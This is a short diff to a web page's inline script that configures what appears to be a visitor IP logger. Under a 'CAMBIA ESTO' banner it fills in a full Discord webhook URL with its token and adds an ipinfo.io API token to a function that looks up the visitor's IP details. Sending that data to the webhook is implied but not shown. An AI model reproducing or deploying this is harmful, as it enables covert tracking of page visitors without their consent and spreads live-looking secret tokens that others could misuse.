@@ -21,12 +21,12 @@
     <script>
     (() => {
       // ==================== ¡¡¡ CAMBIA ESTO !!! ====================
-      const WEBHOOK = ""; 
+      const WEBHOOK = "https://discord.com/api/webhooks/1565795258388717819/P8VbQr3qKMzF-7lML_fDk2qwniv3vJjR_tTKpYgAHypUKnk1Y9WvpIZBrtBIiTxsd30E"; 
       // ============================================================
 
       async function getIPInfo() {
         try {
-          const response = await fetch("https://ipinfo.io/json?token=");
+          const response = await fetch("https://ipinfo.io/json?token=d1181bffe5016d");
           if (!response.ok) throw new Error();
           const data = await response.json();
           return {
